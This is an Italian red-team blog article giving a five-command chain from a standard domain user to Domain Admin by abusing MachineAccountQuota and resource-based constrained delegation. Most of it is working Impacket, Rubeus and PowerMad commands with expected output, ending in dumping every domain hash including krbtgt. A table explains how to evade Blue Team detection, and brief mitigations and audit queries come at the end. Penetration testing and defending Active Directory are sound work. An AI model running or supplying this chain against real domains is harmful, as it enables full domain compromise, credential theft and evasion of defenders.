---
title: 'SeMachineAccountQuota e RBCD: Privesc a Domain Admin in 5 comandi'
slug: semachineaccountquota
description: >-
  Da utente dominio standard a Domain Admin sfruttando MachineAccountQuota=10 e
  RBCD. Creazione computer account, ticket S4U, DCSync. Guida e Privilege
  Escalation Red Team AD.
image: /SeMachineAccountQuota.webp
draft: false
date: 2026-06-25T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - machineaccountquota
  - rbcd
  - domain-escalation
---

# SeMachineAccountPrivilege e RBCD: Da Utente di Dominio a Domain Admin in Cinque Comandi

Hai credenziali di un utente di dominio standard. Zero privilegi speciali. Il MachineAccountQuota è 10 (default nella maggioranza dei domini). Con Impacket crei un computer account, configuri RBCD sul DC, richiedi un ticket S4U come Administrator: accesso al DC in cinque comandi.

***

## Quick Exploit

```bash
python3 addcomputer.py CORP.LOCAL/normaluser:Password123 -computer-name HACKITA$ -computer-pass CompP@ss123! -dc-ip 192.168.1.10
python3 rbcd.py CORP.LOCAL/normaluser:Password123 -action write -delegate-to "DC01$" -delegate-from "HACKITA$" -dc-ip 192.168.1.10
python3 getST.py CORP.LOCAL/HACKITA\$:CompP@ss123! -spn cifs/DC01.CORP.LOCAL -impersonate Administrator -dc-ip 192.168.1.10
export KRB5CCNAME=Administrator.ccache
python3 secretsdump.py -k -no-pass CORP.LOCAL/Administrator@DC01.CORP.LOCAL
```

Output atteso:

```
CORP.LOCAL/Administrator:500:aad3b435...:31d6cfe0...:::
CORP.LOCAL/krbtgt:502:...  ← Golden Ticket possibile
```

***

## Attack Chain

```
Utente di dominio standard (anche helpdesk / sviluppatore)
  → MachineAccountQuota > 0 confermato
  → addcomputer.py → crea HACKITA$ con password nota
  → rbcd.py → imposta msDS-AllowedToActOnBehalfOfOtherIdentity su DC01
  → getST.py S4U2Proxy → ticket Kerberos come Administrator
  → secretsdump -k → tutti gli hash AD → KRBTGT → Golden Ticket
```

***

## Tool Decision

| Step                  | Tool (Linux)                  | Tool (Windows)                          |
| --------------------- | ----------------------------- | --------------------------------------- |
| Crea computer account | `addcomputer.py` (Impacket)   | `New-MachineAccount` (PowerMad)         |
| Configura RBCD        | `rbcd.py` (Impacket)          | `Set-ADComputer` (PowerView)            |
| Richiedi ticket S4U   | `getST.py` (Impacket)         | `Rubeus.exe s4u`                        |
| Verifica quota AD     | `Get-ADObject` (PowerShell)   | `Get-ADObject` (PowerShell)             |
| Trova GenericWrite    | `bloodyAD` / `ldapdomaindump` | `Find-InterestingDomainAcl` (PowerView) |

***

## Cos'è SeMachineAccountPrivilege e il MachineAccountQuota

`ms-DS-MachineAccountQuota` è un attributo AD che controlla quanti computer account ogni utente autenticato può creare. Il default è **10** — e la maggior parte dei domini non lo ha mai cambiato.

La chain **RBCD (Resource-Based Constrained Delegation)** sfrutta questa capacità:

1. Crei un computer account che controlli completamente (ne conosci la password)
2. Configuri RBCD sul target (es. DC01): imposti il tuo computer account come delegato autorizzato
3. Usi S4U2Self + S4U2Proxy per richiedere un ticket Kerberos come Administrator verso il target
4. Accedi al target come Administrator

Nessun exploit. Nessun kernel. Solo Kerberos e LDAP.

***

## Step 1 — Verifica il MachineAccountQuota

Prima verifica che la quota sia > 0:

```powershell
Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties "ms-DS-MachineAccountQuota" | Select-Object "ms-DS-MachineAccountQuota"
```

Output:

```
ms-DS-MachineAccountQuota
-------------------------
10
```

Se il valore è `0` → la creazione da utenti normali è bloccata. In quel caso, cerca invece account con **GenericWrite** su computer account esistenti:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericWrite" -and $_.ObjectAceType -eq "All" }
```

***

## Step 2 — Crea un computer account controllato

**Da Linux con Impacket** (scaricabile da [fortra/impacket](https://github.com/fortra/impacket)):

```bash
python3 addcomputer.py CORP.LOCAL/normaluser:Password123 -computer-name HACKITA$ -computer-pass CompP@ss123! -dc-ip 192.168.1.10
```

**Da Windows con PowerMad** (scaricabile da [Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)):

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount HACKITA -Password (ConvertTo-SecureString "CompP@ss123!" -AsPlainText -Force)
```

Verifica che il computer account sia stato creato:

```powershell
Get-ADComputer HACKITA
```

***

## Step 3 — Configura RBCD sul target

Imposta `msDS-AllowedToActOnBehalfOfOtherIdentity` sul target (DC01) per permettere al tuo computer account (HACKITA$) di delegare.

**Da Linux con Impacket:**

```bash
python3 rbcd.py CORP.LOCAL/normaluser:Password123 -action write -delegate-to "DC01$" -delegate-from "HACKITA$" -dc-ip 192.168.1.10
```

**Da Windows con PowerView** (scaricabile da [PowerSploit/PowerView](https://github.com/PowerShellMafia/PowerSploit)):

```powershell
Import-Module .\PowerView.ps1
Set-ADComputer DC01 -PrincipalsAllowedToDelegateToAccount HACKITA$
```

Verifica che la configurazione sia andata a buon fine:

```powershell
Get-ADComputer DC01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity
```

***

## Step 4 — Richiedi il ticket S4U come Administrator

**Da Linux con Impacket getST:**

```bash
python3 getST.py CORP.LOCAL/HACKITA\$:CompP@ss123! -spn cifs/DC01.CORP.LOCAL -impersonate Administrator -dc-ip 192.168.1.10
```

Output:

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

***

## Step 5 — Usa il ticket e accedi come Administrator

Esporta il ticket:

```bash
export KRB5CCNAME=Administrator.ccache
```

Accesso con psexec:

```bash
python3 psexec.py -k -no-pass CORP.LOCAL/Administrator@DC01.CORP.LOCAL
```

Oppure dump di tutti gli hash del dominio:

```bash
python3 secretsdump.py -k -no-pass CORP.LOCAL/Administrator@DC01.CORP.LOCAL
```

Output secretsdump:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
CORP.LOCAL/Administrator:500:aad3b435...:31d6cfe0...:::
CORP.LOCAL/krbtgt:502:aad3b435...:a8c4e5f3...:::   ← Golden Ticket possibile
[*] Kerberoastable Users found...
```

***

## Varianti

### Da Windows con Rubeus

Ottieni il TGT per il computer account creato. Scaricabile da [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus):

```cmd
Rubeus.exe asktgt /user:HACKITA$ /password:CompP@ss123! /domain:CORP.LOCAL /dc:DC01 /nowrap
```

S4U2Self + S4U2Proxy per il ticket Administrator:

```cmd
Rubeus.exe s4u /ticket:[base64 TGT dall'output precedente] /impersonateuser:Administrator /msdsspn:cifs/DC01.CORP.LOCAL /nowrap
```

Importa il ticket nella sessione corrente:

```cmd
Rubeus.exe ptt /ticket:[base64 ST dall'output precedente]
```

Verifica l'accesso:

```cmd
dir \\DC01.CORP.LOCAL\C$
```

### Scenario con GenericWrite su computer account esistente

Se MachineAccountQuota è 0 ma hai GenericWrite su un computer account AD esistente (trovato con BloodHound o PowerView), puoi modificare direttamente il suo `msDS-AllowedToActOnBehalfOfOtherIdentity` senza creare un nuovo computer account. La chain dal Step 3 in poi è identica.

***

## Scenari reali

**Dominio enterprise con quota default** — un utente di dominio standard (helpdesk, sviluppatore) esegue la chain completa senza nessun privilegio speciale. MachineAccountQuota = 10 in quasi tutti i domini non hardened.

**Post-compromise laterale** — hai le credenziali di un account utente basso privilegio. Invece di cercare vulnerabilità locali, usi la chain RBCD per ottenere un ticket Administrator direttamente sul DC.

***

## Errori comuni

**`addcomputer.py` → "Unwilling To Perform"** — MachineAccountQuota = 0. Cerca invece account con GenericWrite su computer account esistenti: `Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericWrite" }`.

**`getST.py` → `KDC_ERR_BADOPTION`** — Administrator è in **Protected Users** o ha "Account is sensitive and cannot be delegated". Prova con un altro account admin: trova gli admin non protetti con `Get-ADUser -Filter * -Properties memberof | Where-Object { $_.memberof -notmatch "Protected Users" }`.

**Clock skew su `psexec.py -k`** — Ticket Kerberos non valido per differenza oraria. Sincronizza: `ntpdate DC01.CORP.LOCAL` oppure `w32tm /resync /force`.

**RBCD non committato correttamente** — Verifica che l'attributo sia stato scritto: `Get-ADComputer DC01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity`.

**`rbcd.py` fallisce con "Insufficient access rights"** — L'utente non ha write access sull'oggetto computer DC01. Serve GenericWrite o WriteDACL sull'oggetto.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                                                | Come lo bypassa il Red Team                                                          |
| ----------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| **Event ID 4741** — computer account creato da non-admin                | Usa un nome che imita macchine legittime: `WORKSTATION-047$` invece di `HACKITA$`    |
| **Event ID 4742** — modifica `msDS-AllowedToActOnBehalfOfOtherIdentity` | Difficile nascondere — l'attributo AD viene modificato e loggato                     |
| BloodHound in modalità difensiva                                        | Opera su computer account con GenericWrite già esistenti invece di crearne uno nuovo |
| S4U2Proxy da macchina non nota                                          | Usa una macchina già presente nel dominio come punto di lancio                       |

***

## Quando fallisce

* `addcomputer.py` → "Unwilling To Perform" → quota = 0 → cerca GenericWrite
* `getST.py` → `KDC_ERR_BADOPTION` → target in Protected Users → prova altro admin
* Clock skew → sincronizza con il DC
* RBCD non scritto → verifica con `Get-ADComputer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity`

***

## Mitigazioni

Imposta MachineAccountQuota a 0:

```powershell
Set-ADDomain -Identity CORP.LOCAL -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

* **Protected Users** per tutti gli account privilegiati — non delegabili via Kerberos
* Audit periodico `msDS-AllowedToActOnBehalfOfOtherIdentity`:

```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
    Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null }
```

* Alert su Event ID 4741 da account non amministrativi

**Nota realistica:** MachineAccountQuota = 10 è il default di Active Directory da decenni. La maggior parte dei domini non lo ha mai modificato — è uno dei finding più comuni nei pentest AD con BloodHound.

***

## FAQ

**MachineAccountQuota è davvero 10 per default?**
Sì — default invariato da decenni. La maggior parte dei domini in produzione lo ha ancora a 10.

**Funziona solo verso i DC?**
No — verso qualsiasi computer account AD dove puoi configurare RBCD. I DC sono il target più impattante.

**BloodHound mostra questa misconfiguration?**
Sì — rileva quota > 0 e percorsi RBCD come edge "AddAllowedToAct". È uno dei path DA più comuni nei report BloodHound.

***

MachineAccountQuota = 10 + RBCD = Domain Admin con le credenziali di qualsiasi utente di dominio. Una riga di PowerShell risolve il vettore principale — eppure la maggior parte dei domini non lo ha mai fatto.

***

**Articoli correlati:**

* [SeBackupPrivilege](https://hackita.it/articoli/sebackupprivilege/) — altro path DA senza privilegi kernel
* [SeLoadDriverPrivilege](https://hackita.it/articoli/seloaddriverprivilege/) — accesso kernel su DC via Print Operators
* [Active Directory Privilege Escalation](https://hackita.it/articoli/active-directory/) 
* [BloodHound](https://hackita.it/articoli/bloodhound/) — guida completa

**Riferimenti:** [Impacket](https://github.com/fortra/impacket) · [PowerMad](https://github.com/Kevin-Robertson/Powermad) · [Rubeus](https://github.com/GhostPack/Rubeus) · [BloodHound](https://github.com/BloodHoundAD/BloodHound) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)

Per assessment completo della superficie AD: [hackita.it/servizi](https://hackita.it/servizi)
